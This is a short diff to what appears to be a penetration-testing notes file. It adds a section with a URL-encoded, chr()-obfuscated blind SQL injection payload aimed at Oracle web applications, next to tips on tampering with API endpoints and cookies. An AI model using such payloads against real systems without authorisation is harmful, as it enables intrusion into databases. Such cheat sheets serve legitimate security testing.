@@ -245,3 +245,8 @@ POST /api/v3/SetEmail
 /api/v3/SetEmail/1337
 ```
 -try to remove cookies or set unvalid ones
+# SQL INJECTION
+1-If you discover an oracle web app, try this payload
+```
+EHY01%27OR+1%3d1+AND+NVL(ASCII(SUBSTR((SELECT+chr(78)%7c%7cchr(69)%7c%7cchr(84)%7c%7cchr(83)%7c%7cchr(80) )%7c%7cchr(65)%7c%7cchr(82)%7c%7cchr(75)%7c%7cchr(69)%7c%7cchr(82)+FROM+DUAL)%2c9%2c1))%2c0) %3d82--
+```
